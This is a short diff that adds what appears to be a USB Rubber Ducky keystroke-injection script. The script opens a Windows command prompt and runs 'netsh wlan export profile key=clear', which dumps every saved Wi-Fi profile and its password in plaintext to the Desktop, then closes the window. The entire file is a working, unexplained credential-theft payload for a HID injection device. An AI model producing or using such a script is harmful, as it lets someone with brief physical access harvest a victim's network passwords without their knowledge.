@@ -1,0 +1,15 @@
+GUI d
+DELAY 400
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 500
+STRING cd Desktop
+ENTER
+STRING netsh wlan export profile key=clear 
+ENTER
+DELAY 500
+STRING exit
+DELAY 100
+ENTER
